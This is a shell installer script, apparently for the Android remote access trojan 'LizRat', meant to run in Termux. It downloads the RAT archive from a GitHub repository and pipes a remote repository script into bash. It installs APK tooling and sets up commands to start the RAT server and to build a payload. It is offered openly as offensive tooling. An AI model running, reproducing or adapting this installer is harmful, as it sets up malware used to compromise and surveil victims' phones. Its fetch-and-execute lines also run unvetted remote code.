#!/usr/bin/env sh

# ASCII color codes
YLW='\033[1;33m'
BLU='\033[0;34m'
CYN='\033[0;36m'
SAF='\033[38;5;202m'
WIT='\033[37m'
GRN='\033[0;32m'
NC='\033[0m' # No color

echo "${SAF}  ╭╮╱╱╱╱╱╱╱╭━━━╮╱╱╭╮╱╭━━╮╱╱╱╱╱╭╮╱╱╱╭╮╭╮        ${NC}"
echo "${SAF}  ┃┃╱╱╱╱╱╱╱┃╭━╮┃╱╭╯╰╮╰┫┣╯╱╱╱╱╭╯╰╮╱╱┃┃┃┃        ${NC}"
echo "${WIT}  ┃┃╱╱╭┳━━━┫╰━╯┣━┻╮╭╯╱┃┃╭━╮╭━┻╮╭╋━━┫┃┃┃╭━━┳━╮  ${NC}"
echo "${wIT}  ┃┃╱╭╋╋━━┃┃╭╮╭┫╭╮┃┃╱╱┃┃┃╭╮┫━━┫┃┃╭╮┃┃┃┃┃┃━┫╭╯  ${NC}"
echo "${GRN}  ┃╰━╯┃┃┃━━┫┃┃╰┫╭╮┃╰╮╭┫┣┫┃┃┣━━┃╰┫╭╮┃╰┫╰┫┃━┫┃   ${NC}"
echo "${GRN}  ╰━━━┻┻━━━┻╯╰━┻╯╰┻━╯╰━━┻╯╰┻━━┻━┻╯╰┻━┻━┻━━┻╯   ${NC}"
echo "${CYN}                                  By lUCIFER   ${NC}"
echo "${YLW}Updating system${NC}"
echo "${GRN}PRESS 'Y' When ASKED then PRESS ENTER${NC}"
sleep 5

pkg update && pkg upgrade
pkg install wget -y
clear

echo "${SAF}  ╭╮╱╱╱╱╱╱╱╭━━━╮╱╱╭╮╱╭━━╮╱╱╱╱╱╭╮╱╱╱╭╮╭╮        ${NC}"
echo "${SAF}  ┃┃╱╱╱╱╱╱╱┃╭━╮┃╱╭╯╰╮╰┫┣╯╱╱╱╱╭╯╰╮╱╱┃┃┃┃        ${NC}"
echo "${WIT}  ┃┃╱╱╭┳━━━┫╰━╯┣━┻╮╭╯╱┃┃╭━╮╭━┻╮╭╋━━┫┃┃┃╭━━┳━╮  ${NC}"
echo "${wIT}  ┃┃╱╭╋╋━━┃┃╭╮╭┫╭╮┃┃╱╱┃┃┃╭╮┫━━┫┃┃╭╮┃┃┃┃┃┃━┫╭╯  ${NC}"
echo "${GRN}  ┃╰━╯┃┃┃━━┫┃┃╰┫╭╮┃╰╮╭┫┣┫┃┃┣━━┃╰┫╭╮┃╰┫╰┫┃━┫┃   ${NC}"
echo "${GRN}  ╰━━━┻┻━━━┻╯╰━┻╯╰┻━╯╰━━┻╯╰┻━━┻━┻╯╰┻━┻━┻━━┻╯   ${NC}"
echo "${CYN}                                  By lUCIFER   ${NC}"

if [ ! -d "$PREFIX/opt" ]; then
  echo "${BLUE}Setting UP LzRAT${NC}"
  mkdir "$PREFIX/opt"
  echo "${GREEN}SETUP Complete${NC}"
fi
sleep 3
if [ -d "$PREFIX/opt/lizrat" ]; then
  echo "${CYAN}Existing lizrat directory Found! Removing it${NC}"
  rm -rf "$PREFIX/opt/lizrat"
fi
sleep 5

file="lizrat.zip"

if [ -e "$file" ]; then
  echo "${GREEN}File $file exists. NOT Downloading it${NC}"
else
  echo "${GREEN}$file does not exist. Downloading...${NC}"
  wget -q "https://raw.githubusercontent.com/Bhartiya-Hacker/Liz-RAT/master/lizrat.zip" 
fi
sleep 5

clear
echo "${GREEN}Compiling LizRat${NC}"
sleep 6
unzip lizrat.zip
clear

echo "${SAF}  ╭╮╱╱╱╱╱╱╱╭━━━╮╱╱╭╮╱╭━━╮╱╱╱╱╱╭╮╱╱╱╭╮╭╮        ${NC}"
echo "${SAF}  ┃┃╱╱╱╱╱╱╱┃╭━╮┃╱╭╯╰╮╰┫┣╯╱╱╱╱╭╯╰╮╱╱┃┃┃┃        ${NC}"
echo "${WIT}  ┃┃╱╱╭┳━━━┫╰━╯┣━┻╮╭╯╱┃┃╭━╮╭━┻╮╭╋━━┫┃┃┃╭━━┳━╮  ${NC}"
echo "${wIT}  ┃┃╱╭╋╋━━┃┃╭╮╭┫╭╮┃┃╱╱┃┃┃╭╮┫━━┫┃┃╭╮┃┃┃┃┃┃━┫╭╯  ${NC}"
echo "${GRN}  ┃╰━╯┃┃┃━━┫┃┃╰┫╭╮┃╰╮╭┫┣┫┃┃┣━━┃╰┫╭╮┃╰┫╰┫┃━┫┃   ${NC}"
echo "${GRN}  ╰━━━┻┻━━━┻╯╰━┻╯╰┻━╯╰━━┻╯╰┻━━┻━┻╯╰┻━┻━┻━━┻╯   ${NC}"
echo "${CYN}                                  By lUCIFER   ${NC}"

echo "${YLW}Setting UP Directories${NC}"
mv -f lizrat "$PREFIX/opt"
echo "${GRN}Directory SETUP Complete${NC}"
sleep 5
clear

echo "${SAF}  ╭╮╱╱╱╱╱╱╱╭━━━╮╱╱╭╮╱╭━━╮╱╱╱╱╱╭╮╱╱╱╭╮╭╮        ${NC}"
echo "${SAF}  ┃┃╱╱╱╱╱╱╱┃╭━╮┃╱╭╯╰╮╰┫┣╯╱╱╱╱╭╯╰╮╱╱┃┃┃┃        ${NC}"
echo "${WIT}  ┃┃╱╱╭┳━━━┫╰━╯┣━┻╮╭╯╱┃┃╭━╮╭━┻╮╭╋━━┫┃┃┃╭━━┳━╮  ${NC}"
echo "${wIT}  ┃┃╱╭╋╋━━┃┃╭╮╭┫╭╮┃┃╱╱┃┃┃╭╮┫━━┫┃┃╭╮┃┃┃┃┃┃━┫╭╯  ${NC}"
echo "${GRN}  ┃╰━╯┃┃┃━━┫┃┃╰┫╭╮┃╰╮╭┫┣┫┃┃┣━━┃╰┫╭╮┃╰┫╰┫┃━┫┃   ${NC}"
echo "${GRN}  ╰━━━┻┻━━━┻╯╰━┻╯╰┻━╯╰━━┻╯╰┻━━┻━┻╯╰┻━┻━┻━━┻╯   ${NC}"
echo "${CYN}                                  By lUCIFER   ${NC}"

echo "${YLW}Checking if java, nodejs & npm is installed or not${NC}"
if ! command -v java >/dev/null 2>&1 || ! command -v node >/dev/null 2>&1 || ! command -v npm >/dev/null 2>&1; then
  echo "${CYN}Packages not found, Installing them${NC}"
  pkg install -y openjdk-17 nodejs
else
  echo "${CYN}Packages Found, Removing them${NC}"
  pkg remove -y openjdk-17 nodejs
  echo "${CYN}Installing packages${NC}"
  pkg install -y openjdk-17 nodejs
fi
sleep 3

clear

echo "${SAF}  ╭╮╱╱╱╱╱╱╱╭━━━╮╱╱╭╮╱╭━━╮╱╱╱╱╱╭╮╱╱╱╭╮╭╮        ${NC}"
echo "${SAF}  ┃┃╱╱╱╱╱╱╱┃╭━╮┃╱╭╯╰╮╰┫┣╯╱╱╱╱╭╯╰╮╱╱┃┃┃┃        ${NC}"
echo "${WIT}  ┃┃╱╱╭┳━━━┫╰━╯┣━┻╮╭╯╱┃┃╭━╮╭━┻╮╭╋━━┫┃┃┃╭━━┳━╮  ${NC}"
echo "${wIT}  ┃┃╱╭╋╋━━┃┃╭╮╭┫╭╮┃┃╱╱┃┃┃╭╮┫━━┫┃┃╭╮┃┃┃┃┃┃━┫╭╯  ${NC}"
echo "${GRN}  ┃╰━╯┃┃┃━━┫┃┃╰┫╭╮┃╰╮╭┫┣┫┃┃┣━━┃╰┫╭╮┃╰┫╰┫┃━┫┃   ${NC}"
echo "${GRN}  ╰━━━┻┻━━━┻╯╰━┻╯╰┻━╯╰━━┻╯╰┻━━┻━┻╯╰┻━┻━┻━━┻╯   ${NC}"
echo "${CYN}                                  By lUCIFER   ${NC}"

echo "${YLW}Installing pm2${NC}"
npm install pm2 -g

sleep 5

echo "${YLW}Installation Complete${NC}"

sleep 5

clear

echo "${SAF}  ╭╮╱╱╱╱╱╱╱╭━━━╮╱╱╭╮╱╭━━╮╱╱╱╱╱╭╮╱╱╱╭╮╭╮        ${NC}"
echo "${SAF}  ┃┃╱╱╱╱╱╱╱┃╭━╮┃╱╭╯╰╮╰┫┣╯╱╱╱╱╭╯╰╮╱╱┃┃┃┃        ${NC}"
echo "${WIT}  ┃┃╱╱╭┳━━━┫╰━╯┣━┻╮╭╯╱┃┃╭━╮╭━┻╮╭╋━━┫┃┃┃╭━━┳━╮  ${NC}"
echo "${wIT}  ┃┃╱╭╋╋━━┃┃╭╮╭┫╭╮┃┃╱╱┃┃┃╭╮┫━━┫┃┃╭╮┃┃┃┃┃┃━┫╭╯  ${NC}"
echo "${GRN}  ┃╰━╯┃┃┃━━┫┃┃╰┫╭╮┃╰╮╭┫┣┫┃┃┣━━┃╰┫╭╮┃╰┫╰┫┃━┫┃   ${NC}"
echo "${GRN}  ╰━━━┻┻━━━┻╯╰━┻╯╰┻━╯╰━━┻╯╰┻━━┻━┻╯╰┻━┻━┻━━┻╯   ${NC}"
echo "${CYN}                                  By lUCIFER   ${NC}"

echo "${YLW}Installing apktool, zipalign & apksigner${NC}"
sleep 5

curl -s https://raw.githubusercontent.com/rendiix/rendiix.github.io/master/install-repo.sh | bash
pkg install -y apksigner 
pkg install -y apktool zipalign

clear

echo "${SAF}  ╭╮╱╱╱╱╱╱╱╭━━━╮╱╱╭╮╱╭━━╮╱╱╱╱╱╭╮╱╱╱╭╮╭╮        ${NC}"
echo "${SAF}  ┃┃╱╱╱╱╱╱╱┃╭━╮┃╱╭╯╰╮╰┫┣╯╱╱╱╱╭╯╰╮╱╱┃┃┃┃        ${NC}"
echo "${WIT}  ┃┃╱╱╭┳━━━┫╰━╯┣━┻╮╭╯╱┃┃╭━╮╭━┻╮╭╋━━┫┃┃┃╭━━┳━╮  ${NC}"
echo "${wIT}  ┃┃╱╭╋╋━━┃┃╭╮╭┫╭╮┃┃╱╱┃┃┃╭╮┫━━┫┃┃╭╮┃┃┃┃┃┃━┫╭╯  ${NC}"
echo "${GRN}  ┃╰━╯┃┃┃━━┫┃┃╰┫╭╮┃╰╮╭┫┣┫┃┃┣━━┃╰┫╭╮┃╰┫╰┫┃━┫┃   ${NC}"
echo "${GRN}  ╰━━━┻┻━━━┻╯╰━┻╯╰┻━╯╰━━┻╯╰┻━━┻━┻╯╰┻━┻━┻━━┻╯   ${NC}"
echo "${CYN}                                  By lUCIFER   ${NC}"

echo "${YLW}Installing Lizrat${NC}"

sleep 5

npm install --prefix $PREFIX/opt/lizrat

clear

echo "${SAF}  ╭╮╱╱╱╱╱╱╱╭━━━╮╱╱╭╮╱╭━━╮╱╱╱╱╱╭╮╱╱╱╭╮╭╮        ${NC}"
echo "${SAF}  ┃┃╱╱╱╱╱╱╱┃╭━╮┃╱╭╯╰╮╰┫┣╯╱╱╱╱╭╯╰╮╱╱┃┃┃┃        ${NC}"
echo "${WIT}  ┃┃╱╱╭┳━━━┫╰━╯┣━┻╮╭╯╱┃┃╭━╮╭━┻╮╭╋━━┫┃┃┃╭━━┳━╮  ${NC}"
echo "${wIT}  ┃┃╱╭╋╋━━┃┃╭╮╭┫╭╮┃┃╱╱┃┃┃╭╮┫━━┫┃┃╭╮┃┃┃┃┃┃━┫╭╯  ${NC}"
echo "${GRN}  ┃╰━╯┃┃┃━━┫┃┃╰┫╭╮┃╰╮╭┫┣┫┃┃┣━━┃╰┫╭╮┃╰┫╰┫┃━┫┃   ${NC}"
echo "${GRN}  ╰━━━┻┻━━━┻╯╰━┻╯╰┻━╯╰━━┻╯╰┻━━┻━┻╯╰┻━┻━┻━━┻╯   ${NC}"
echo "${CYN}                                  By lUCIFER   ${NC}"

echo "Creating Symlinks"
sleep 5

echo "pushd $PREFIX/opt/lizrat && pm2 start index.js && popd" > "$PREFIX/bin/liz"
echo "pushd $PREFIX/opt/lizrat && pm2 stop index.js && popd" > "$PREFIX/bin/lizx"
echo "pushd $PREFIX/opt/lizrat && ./builder.sh && popd" > "$PREFIX/bin/lizb"

chmod +x "$PREFIX/bin/liz" "$PREFIX/bin/lizx" "$PREFIX/bin/lizb"

clear

echo "${SAF}  ╭╮╱╱╱╱╱╱╱╭━━━╮╱╱╭╮╱╭━━╮╱╱╱╱╱╭╮╱╱╱╭╮╭╮        ${NC}"
echo "${SAF}  ┃┃╱╱╱╱╱╱╱┃╭━╮┃╱╭╯╰╮╰┫┣╯╱╱╱╱╭╯╰╮╱╱┃┃┃┃        ${NC}"
echo "${WIT}  ┃┃╱╱╭┳━━━┫╰━╯┣━┻╮╭╯╱┃┃╭━╮╭━┻╮╭╋━━┫┃┃┃╭━━┳━╮  ${NC}"
echo "${wIT}  ┃┃╱╭╋╋━━┃┃╭╮╭┫╭╮┃┃╱╱┃┃┃╭╮┫━━┫┃┃╭╮┃┃┃┃┃┃━┫╭╯  ${NC}"
echo "${GRN}  ┃╰━╯┃┃┃━━┫┃┃╰┫╭╮┃╰╮╭┫┣┫┃┃┣━━┃╰┫╭╮┃╰┫╰┫┃━┫┃   ${NC}"
echo "${GRN}  ╰━━━┻┻━━━┻╯╰━┻╯╰┻━╯╰━━┻╯╰┻━━┻━┻╯╰┻━┻━┻━━┻╯   ${NC}"
echo "${CYN}                                  By lUCIFER   ${NC}"

echo "${GRN}Installation complete${NC}, ${SAF}Run Lizrat from Anywhere in TERMUX by executing 'liz'${NC}"
echo "${SAf}Please REMOVE 'LizRat Dir' Present at HOME${NC}"
echo "${CYN}To build payload execute 'lizb' Anywhere in TERMUX${NC}"
echo "${SAF}To stop the Lizrat server execute 'lizx' Anywhere in TERMUX${NC}"
